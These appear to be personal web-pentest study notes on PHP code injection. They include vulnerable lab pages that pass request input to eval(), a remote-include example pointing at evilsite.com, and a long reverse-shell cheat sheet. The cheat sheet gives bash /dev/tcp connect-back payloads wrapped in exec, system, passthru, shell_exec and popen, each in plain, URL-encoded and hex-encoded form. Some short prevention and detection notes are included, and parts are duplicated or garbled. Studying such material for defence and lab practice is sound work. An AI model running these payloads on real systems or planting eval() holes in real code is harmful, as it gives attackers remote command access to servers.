# Code Injection

## What is Code Injection?

**Code Injection** is a cyberattack where an attacker inserts **malicious code** into an application.  
The application then **executes this code**, due to improper handling of **untrusted user input**.

This can allow attackers to:

- Change application behavior
    
- Steal sensitive data
    
- Gain unauthorized system access
    

---

## Why Code Injection Happens

- No input validation
    
- No sanitization
    
- Unsafe use of functions like `eval()` or `include()`
    
- Trusting user-controlled data
    

---

## How Code Injection Works

1. Application accepts user input
    
2. Input is directly used in code execution
    
3. Malicious code is injected
    
4. Server executes attacker’s code
    

---

## Examples of Code Injection

### Example 1: PHP `include()` Injection

**Vulnerable Code (concept):**

`include($_GET['page']);`

**Normal request:**

`http://testsite.com/index.php?page=contact.php`

**Malicious request:**

`http://testsite.com/?page=http://evilsite.com/evilcode.php`

✅ Result:  
The server loads and executes the attacker’s **remote PHP script**.

---

### Example 2: PHP `eval()` Injection

**Vulnerable Code:**

`$myvar = "varname"; $x = $_GET['arg']; eval("$myvar = $x;");`

**Malicious input:**

`phpinfo()`

✅ Result:  
Attacker executes arbitrary PHP code on the server.

---

## Difference from Command Injection

- **Code Injection** → Injects code in the application’s language (PHP, SQL, JS)
    
- **Command Injection** → Injects OS shell commands
    

---

## Types of Code Injection

- PHP Code Injection
    
- SQL Injection
    
- JavaScript Injection
    
- Expression Language Injection
    
- Template Injection
    

---

## Impact of Code Injection

- Remote Code Execution (RCE)
    
- Data theft
    
- Website defacement
    
- Full server compromise
    

---

## Prevention / Protection

✔ Validate all user input  
✔ Use allowlists (not blacklists)  
✔ Avoid `eval()`, dynamic `include()`  
✔ Use prepared statements  
✔ Encode output properly  
✔ Apply least privilege

---

## One-Line Definition (Exam Ready)

> **Code Injection is a vulnerability where attackers inject malicious code into an application, which is then executed due to improper input validation.**



# code-

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Code Injection</title>
</head>
<body>

<pre>
<?php
    $fun = $_REQUEST['fun'];

    echo $fun . "<br>";

    eval($fun.";");
?>
</pre>

</body>
</html>


# Code Injection – PHP eval() Example

## Description

The following PHP script demonstrates a **Code Injection vulnerability** caused by the unsafe use of the `eval()` function with user-controlled input.

### Example URLs
```text
http://192.168.1.31/web-pentest/code-injection.php?fun=sleep(10)
http://192.168.1.31/web-pentest/code-injection.php?fun=phpinfo()
Vulnerable Code (Concept)
The application retrieves a parameter named fun from the user request and executes it as PHP code.

php
Copy code
$fun = $_REQUEST['fun'];
echo $fun . "<br>";
eval($fun . ";");
Explanation
The line

php
Copy code
$fun = $_REQUEST['fun'];
assigns user-controlled input (GET, POST, or COOKIE) to the $fun variable.

The line

php
Copy code
echo $fun . "<br>";
prints the raw user input back to the browser without sanitization.

The critical vulnerability lies in:

php
Copy code
eval($fun . ";");
which executes the contents of $fun directly as PHP code.

Why This Is Dangerous
This creates a Code Injection vulnerability, allowing attackers to execute arbitrary PHP code on the server.

An attacker can:

Execute system-level commands

Steal or modify data

Compromise the entire server

Perform Remote Code Execution (RCE)

Security Risk
Using eval() on unsanitized user input is extremely dangerous and should never be used in production environments.

While this example demonstrates how simple code injection can be, it highlights a critical security risk.

Educational Purpose
This example is intended only for learning and demonstration purposes, to emphasize:

The risks of unsafe code execution

The consequences of poor input validation

The importance of secure coding practices

Key Takeaway
Never execute user input as code. Avoid eval() and always validate, sanitize, and strictly control user input.
````


# what is reverse shell-
## What is a Reverse Shell?

![https://cdn.prod.website-files.com/681e366f54a6e3ce87159ca4/6877c6d94cd1d4bca7c48143_bind-shell-vs-reverse-shell-01.png?utm_source=chatgpt.com](https://cdn.prod.website-files.com/681e366f54a6e3ce87159ca4/6877c6d94cd1d4bca7c48143_bind-shell-vs-reverse-shell-01.png?utm_source=chatgpt.com)

![https://pub.mdpi-res.com/applsci/applsci-13-07161/article_deploy/html/images/applsci-13-07161-g001.png?1686819501=&utm_source=chatgpt.com](https://pub.mdpi-res.com/applsci/applsci-13-07161/article_deploy/html/images/applsci-13-07161-g001.png?1686819501=&utm_source=chatgpt.com)

![https://silviavali.github.io/assets/img/SLAE/bindreverse.png?utm_source=chatgpt.com](https://silviavali.github.io/assets/img/SLAE/bindreverse.png?utm_source=chatgpt.com)

4

A **reverse shell** is a technique where a **target system initiates a connection back to an attacker’s machine** and provides remote command-line access.

Instead of the attacker connecting **to** the victim, the **victim connects out** to the attacker.

---

## 🔹 Simple Definition

> A reverse shell allows an attacker to remotely control a victim’s system after the victim system connects back to the attacker.

---

## 🔹 How a Reverse Shell Works (Conceptual Flow)

1. **Attacker** starts a listener on their system
    
2. **Victim system** executes a command (via vulnerability)
    
3. Victim **initiates an outbound connection**
    
4. Attacker receives a **shell (command access)**
    

📌 This works even when the victim is behind a **firewall or NAT**.

---

## 🔹 Why Reverse Shells Are Used

- Outbound connections are usually **allowed**
    
- Firewalls often **block incoming connections**
    
- Easier to bypass network restrictions
    
- Common in **post-exploitation**
    

---

## 🔹 Reverse Shell vs Bind Shell

|Feature|Reverse Shell|Bind Shell|
|---|---|---|
|Who connects?|Victim → Attacker|Attacker → Victim|
|Firewall friendly|✅ Yes|❌ Often blocked|
|Common usage|Very common|Less common|
|Risk to attacker|Lower exposure|Higher exposure|

---

## 🔹 Where Reverse Shells Appear (Cyber Security)

- Command Injection
    
- Remote Code Execution (RCE)
    
- File Upload vulnerabilities
    
- Deserialization flaws
    
- Web shells
    

---

## 🔹 Real-World Analogy

> Imagine a locked building where you **cannot enter**, but someone **inside calls you and hands over control** of everything inside.

---

## 🔹 Security Perspective (Defensive View)

⚠️ Reverse shells indicate **system compromise**

### Detection Methods

- Unexpected outbound connections
    
- Suspicious processes (bash, sh, cmd spawning)
    
- IDS/IPS alerts
    
- EDR behavioral detection
    

### Prevention

- Input validation
    
- Least privilege
    
- Egress filtering
    
- Web Application Firewall (WAF)
    
- Patch management
    

---

## 🔹 One-Line Exam Answer

> A reverse shell is a technique where a compromised system connects back to an attacker and provides remote command execution access.

# commands for reverse   shell-
`exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.8/443 0>&1")`

`exec("/bin/bash%20-c%20'bash%20-i%20>&%20/dev/tcp/192.168.1.8/443%200>&1'")`

`exec("/bin/bash%20-c%20'bash%20-i%20>&%20/dev/tcp/192.168.1.8/443%200>&1'")`

`exec(%22%2fbin%2fbash%20-c%20%27bash%20-i%20%3e%26%20%2fdev%2ftcp%2f192.168.1.8%2f443%200%3e%261%27%22)`
### 🔹 `exec()` Variants

`exec("/bin/bash - -i >& /dev/tcp/192.168.1.8/443 0>&1") exec("/bin/bash - i & /dev/tcp/192.168.1.8/443 0>&1") exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.8/443 0>&1'")`

**URL-encoded**

`exec("%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.8%2F443%200%3E%261%27")`

---

### 🔹 `passthru()` Variants

`passthru("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.8/443 0>&1'") passthru("/bin/bash - -i >& /dev/tcp/192.168.1.8/443 0>&1")`

**URL-encoded**

`passthru("/bin/bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/192.168.1.8/443%200%3E%261%27") passthru("%22%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.8%2F443%200%3E%261%27%22")`

---

### 🔹 `system()` Variants

`system("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.8/443 0>&1'") system("/bin/bash - -i >& /dev/tcp/192.168.1.8/443 0>&1") system("/bin/bash - -i & /dev/tcp/192.168.1.8/443 0>&1")`

**URL-encoded**

`system("%22%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.8%2F443%200%3E%261%27%22")`

---

### 🔹 Fully URL-Encoded (Standalone)

`%2fbin%2fbash%20-c%20%27bash%20-i%20%3e%26%20%2fdev%2ftcp%2f192.168.1.8%2f443%200%3e%261%27



s## 📌 PHP `system()` Variants

`system("%22%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.8%2F443%200%3E%261%27%22");`

**Hex-encoded**

`%73%79%73%74%65%6d%28%22%2f%62%69%6e%2f%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%31%2e%38%2f%34%34%33%20%30%3e%26%31%27%22%29`

---

## 📌 PHP `shell_exec()` Variants

### Plain

`shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.8/443 0>&1'");`

### URL-encoded (partial)

`shell_exec("/bin/bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/192.168.1.8/443%200%3E%261'");`

`shell_exec("/bin/bash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.8%2F443%200%3E%261'");`

### Fully URL-encoded

`shell_exec("%22%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.8%2F443%200%3E%261%27%22");`

### Hex-encoded

`%73%68%65%6c%6c%5f%65%78%65%63%28%22%2f%62%69%6e%2f%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%31%2e%38%2f%34%34%33%20%30%3e%26%31%27%22%29`

---

## 📌 Command Execution Test (Benign)

### Plain

`ping -c 4 127.0.0.1`

### URL-encoded

`ping%20-c%204%20127.0.0.1`

---

## 📌 Standalone Bash Command

### Plain

`/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.8/443 0>&1'`


copy this code this have ` IN FIRST 1 KE SIDE KA ICON KEYBOARD ME

### URL-encoded

`%2fbin%2fbash%20-c%20%27bash%20-i%20%3e%26%20%2fdev%2ftcp%2f192.168.1.8%2f443%200%3e%261%27`

---

## 📌 PHP `popen()` Variants

`popen("id", "r");`

`popen("ping -c 4 127.0.0.1", "r");`

popen("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.7/443 0>&1'", "r");
---

### ✅ Result

- Grouped by **function**
    
- Encodings clearly separated
    
- Easy to read, copy, or document
    
- Suitable for **study, analysis, or reporting**

# CODE INJECTION POST METHOD-
IN POST ,METHOD URL NOT ENCODED IT DIRECTLY USED AS PAYLOAD

# VIM - code-injection2.php
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Code Injection</title>
</head>
<body>

<form action="code-injection-2.php" method="POST">
    Function:
    <input type="text" name="fun"><br />
    <input type="submit" name="run" value="run">
</form>

<pre>
<?php
if (isset($_POST['fun'])) {
    $fun = $_POST['fun'];
    eval($fun.";");
}
?>
</pre>

</body>
</html>